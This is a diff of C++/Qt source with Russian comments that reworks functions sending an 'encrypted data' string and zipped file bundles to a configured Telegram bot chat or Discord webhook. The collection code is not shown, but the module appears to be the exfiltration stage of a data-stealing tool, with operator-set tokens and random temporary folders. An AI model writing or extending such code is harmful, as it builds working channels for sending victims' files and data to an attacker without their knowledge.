@@ -1619,7 +1619,7 @@ std::string MainWindow::archiveData(const std::string& dir, const std::vector<st
 }
 
 // Реализация sendToTelegram
-void MainWindow::sendToTelegram(const std::vector<std::string>& files) {
+void MainWindow::sendToTelegram(const std::string& data, const std::vector<std::string>& files) {
     emitLog("Отправка данных через Telegram...");
 
     if (config.telegramBotToken.empty() || config.telegramChatId.empty()) {
@@ -1627,74 +1627,95 @@ void MainWindow::sendToTelegram(const std::vector<std::string>& files) {
         return;
     }
 
-    std::string tempDir = "temp_" + generateRandomString(8);
-    std::filesystem::create_directories(tempDir);
-
-    std::string createdZipPath = archiveData(tempDir, files);
-    if (createdZipPath.empty()) {
-        emitLog("Ошибка: Не удалось создать ZIP-архив для отправки через Telegram");
-        std::filesystem::remove_all(tempDir);
-        return;
-    }
-
-    std::uintmax_t fileSize = std::filesystem::file_size(createdZipPath);
-    const std::uintmax_t telegramFileSizeLimit = 50 * 1024 * 1024; // 50 МБ
-    if (fileSize > telegramFileSizeLimit) {
-        emitLog("Ошибка: Размер ZIP-архива (" + QString::number(fileSize / (1024 * 1024)) + " МБ) превышает лимит Telegram (50 МБ)");
-        std::filesystem::remove_all(tempDir);
-        return;
-    }
-
     CURL* curl = curl_easy_init();
     if (!curl) {
         emitLog("Ошибка: Не удалось инициализировать CURL для Telegram");
-        std::filesystem::remove_all(tempDir);
         return;
     }
 
-    curl_mime* mime = curl_mime_init(curl);
-    curl_mimepart* part;
-
-    part = curl_mime_addpart(mime);
-    curl_mime_name(part, "chat_id");
-    curl_mime_data(part, config.telegramChatId.c_str(), CURL_ZERO_TERMINATED);
-
-    part = curl_mime_addpart(mime);
-    curl_mime_name(part, "document");
-    curl_mime_filedata(part, createdZipPath.c_str());
-
+    // Отправка текстовых данных (data)
+    std::string url = "https://api.telegram.org/bot" + config.telegramBotToken + "/sendMessage";
+    std::string postFields = "chat_id=" + config.telegramChatId + "&text=" + curl_easy_escape(curl, data.c_str(), data.length());
     std::string response;
-    std::string url = "https://api.telegram.org/bot" + config.telegramBotToken + "/sendDocument";
+
     curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
-    curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
 
     CURLcode res = curl_easy_perform(curl);
     if (res != CURLE_OK) {
-        emitLog("Ошибка отправки через Telegram: " + QString::fromStdString(curl_easy_strerror(res)));
+        emitLog("Ошибка отправки текста через Telegram: " + QString::fromStdString(curl_easy_strerror(res)));
     } else {
         QJsonDocument doc = QJsonDocument::fromJson(QByteArray::fromStdString(response));
         if (doc.isNull() || !doc.object().value("ok").toBool()) {
-            emitLog("Ошибка Telegram API: " + QString::fromStdString(response));
+            emitLog("Ошибка Telegram API при отправке текста: " + QString::fromStdString(response));
         } else {
-            emitLog("Данные успешно отправлены через Telegram");
+            emitLog("Текст успешно отправлен через Telegram");
         }
     }
 
-    curl_mime_free(mime);
-    curl_easy_cleanup(curl);
+    // Создание и отправка ZIP-архива с файлами
+    if (!files.empty()) {
+        std::string tempDir = "temp_" + generateRandomString(8);
+        std::filesystem::create_directories(tempDir);
 
-    try {
+        std::string createdZipPath = archiveData(tempDir, files);
+        if (createdZipPath.empty()) {
+            emitLog("Ошибка: Не удалось создать ZIP-архив для отправки через Telegram");
+            curl_easy_cleanup(curl);
+            std::filesystem::remove_all(tempDir);
+            return;
+        }
+
+        std::uintmax_t fileSize = std::filesystem::file_size(createdZipPath);
+        const std::uintmax_t telegramFileSizeLimit = 50 * 1024 * 1024; // 50 МБ
+        if (fileSize > telegramFileSizeLimit) {
+            emitLog("Ошибка: Размер ZIP-архива (" + QString::number(fileSize / (1024 * 1024)) + " МБ) превышает лимит Telegram (50 МБ)");
+            curl_easy_cleanup(curl);
+            std::filesystem::remove_all(tempDir);
+            return;
+        }
+
+        curl_mime* mime = curl_mime_init(curl);
+        curl_mimepart* part;
+
+        part = curl_mime_addpart(mime);
+        curl_mime_name(part, "chat_id");
+        curl_mime_data(part, config.telegramChatId.c_str(), CURL_ZERO_TERMINATED);
+
+        part = curl_mime_addpart(mime);
+        curl_mime_name(part, "document");
+        curl_mime_filedata(part, createdZipPath.c_str());
+
+        url = "https://api.telegram.org/bot" + config.telegramBotToken + "/sendDocument";
+        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
+        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
+
+        res = curl_easy_perform(curl);
+        if (res != CURLE_OK) {
+            emitLog("Ошибка отправки архива через Telegram: " + QString::fromStdString(curl_easy_strerror(res)));
+        } else {
+            QJsonDocument doc = QJsonDocument::fromJson(QByteArray::fromStdString(response));
+            if (doc.isNull() || !doc.object().value("ok").toBool()) {
+                emitLog("Ошибка Telegram API при отправке архива: " + QString::fromStdString(response));
+            } else {
+                emitLog("ZIP-архив успешно отправлен через Telegram");
+            }
+        }
+
+        curl_mime_free(mime);
         std::filesystem::remove_all(tempDir);
-        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
-    } catch (const std::exception& e) {
-        emitLog("Ошибка при удалении временной директории: " + QString::fromStdString(e.what()));
     }
+
+    curl_easy_cleanup(curl);
+    emitLog("Отправка в Telegram завершена");
 }
 
 // Реализация sendToDiscord
-void MainWindow::sendToDiscord(const std::vector<std::string>& files) {
+void MainWindow::sendToDiscord(const std::string& data, const std::vector<std::string>& files) {
     emitLog("Отправка данных через Discord...");
 
     if (config.discordWebhook.empty()) {
@@ -1702,35 +1723,49 @@ void MainWindow::sendToDiscord(const std::vector<std::string>& files) {
         return;
     }
 
-    std::string tempDir = "temp_" + generateRandomString(8);
-    std::filesystem::create_directories(tempDir);
-
-    std::string createdZipPath = archiveData(tempDir, files);
-    if (createdZipPath.empty()) {
-        emitLog("Ошибка: Не удалось создать ZIP-архив для отправки через Discord");
-        std::filesystem::remove_all(tempDir);
-        return;
-    }
-
-    std::uintmax_t fileSize = std::filesystem::file_size(createdZipPath);
-    const std::uintmax_t discordFileSizeLimit = 25 * 1024 * 1024; // 25 МБ
-    if (fileSize > discordFileSizeLimit) {
-        emitLog("Ошибка: Размер ZIP-архива (" + QString::number(fileSize / (1024 * 1024)) + " МБ) превышает лимит Discord (25 МБ)");
-        std::filesystem::remove_all(tempDir);
-        return;
-    }
-
     CURL* curl = curl_easy_init();
     if (!curl) {
         emitLog("Ошибка: Не удалось инициализировать CURL для Discord");
-        std::filesystem::remove_all(tempDir);
         return;
     }
 
     curl_mime* mime = curl_mime_init(curl);
-    curl_mimepart* part = curl_mime_addpart(mime);
-    curl_mime_name(part, "file");
-    curl_mime_filedata(part, createdZipPath.c_str());
+    curl_mimepart* part;
+
+    // Отправка текстовых данных (data)
+    part = curl_mime_addpart(mime);
+    curl_mime_name(part, "content");
+    curl_mime_data(part, data.c_str(), data.length());
+
+    // Создание и добавление ZIP-архива с файлами
+    std::string tempDir = "temp_" + generateRandomString(8);
+    std::filesystem::create_directories(tempDir);
+    std::string createdZipPath;
+
+    if (!files.empty()) {
+        createdZipPath = archiveData(tempDir, files);
+        if (createdZipPath.empty()) {
+            emitLog("Ошибка: Не удалось создать ZIP-архив для отправки через Discord");
+            curl_mime_free(mime);
+            curl_easy_cleanup(curl);
+            std::filesystem::remove_all(tempDir);
+            return;
+        }
+
+        std::uintmax_t fileSize = std::filesystem::file_size(createdZipPath);
+        const std::uintmax_t discordFileSizeLimit = 25 * 1024 * 1024; // 25 МБ
+        if (fileSize > discordFileSizeLimit) {
+            emitLog("Ошибка: Размер ZIP-архива (" + QString::number(fileSize / (1024 * 1024)) + " МБ) превышает лимит Discord (25 МБ)");
+            curl_mime_free(mime);
+            curl_easy_cleanup(curl);
+            std::filesystem::remove_all(tempDir);
+            return;
+        }
+
+        part = curl_mime_addpart(mime);
+        curl_mime_name(part, "file");
+        curl_mime_filedata(part, createdZipPath.c_str());
+    }
 
     std::string response;
     curl_easy_setopt(curl, CURLOPT_URL, config.discordWebhook.c_str());
@@ -1745,18 +1780,20 @@ void MainWindow::sendToDiscord(const std::vector<std::string>& files) {
         if (response.find("id") == std::string::npos) {
             emitLog("Ошибка Discord Webhook: " + QString::fromStdString(response));
         } else {
-            emitLog("Данные успешно отправлены через Discord");
+            emitLog("Данные и ZIP-архив успешно отправлены через Discord");
         }
     }
 
     curl_mime_free(mime);
     curl_easy_cleanup(curl);
 
-    try {
-        std::filesystem::remove_all(tempDir);
-        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
-    } catch (const std::exception& e) {
-        emitLog("Ошибка при удалении временной директории: " + QString::fromStdString(e.what()));
+    if (!tempDir.empty()) {
+        try {
+            std::filesystem::remove_all(tempDir);
+            emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
+        } catch (const std::exception& e) {
+            emitLog("Ошибка при удалении временной директории: " + QString::fromStdString(e.what()));
+        }
     }
 }
 
@@ -1764,40 +1801,15 @@ void MainWindow::sendToDiscord(const std::vector<std::string>& files) {
 void MainWindow::sendData(const QString& encryptedData, const std::vector<std::string>& files) {
     emitLog("Подготовка данных для отправки...");
 
-    // Создаем временный файл для encryptedData
-    std::string tempDir = "temp_" + generateRandomString(8);
-    std::filesystem::create_directories(tempDir);
-    std::string dataFilePath = tempDir + "/encrypted_data.txt";
-    std::ofstream dataFile(dataFilePath, std::ios::binary);
-    if (dataFile.is_open()) {
-        std::string data = encryptedData.toStdString();
-        dataFile.write(data.c_str(), data.size());
-        dataFile.close();
-    } else {
-        emitLog("Ошибка: Не удалось создать временный файл для encryptedData");
-        std::filesystem::remove_all(tempDir);
-        return;
-    }
-
-    // Добавляем временный файл в список файлов
-    std::vector<std::string> allFiles = files;
-    allFiles.push_back(dataFilePath);
+    std::string data = encryptedData.toStdString();
 
     // Выбираем метод отправки
     if (config.sendMethod == "Telegram") {
-        sendToTelegram(allFiles);
+        sendToTelegram(data, files);
     } else if (config.sendMethod == "Discord") {
-        sendToDiscord(allFiles);
+        sendToDiscord(data, files);
     } else {
-        saveToLocalFile(encryptedData.toStdString(), "output");
-    }
-
-    // Удаляем временную директорию
-    try {
-        std::filesystem::remove_all(tempDir);
-        emitLog("Временная директория удалена: " + QString::fromStdString(tempDir));
-    } catch (const std::exception& e) {
-        emitLog("Ошибка при удалении временной директории: " + QString::fromStdString(e.what()));
+        saveToLocalFile(data, "output");
     }
 }
 
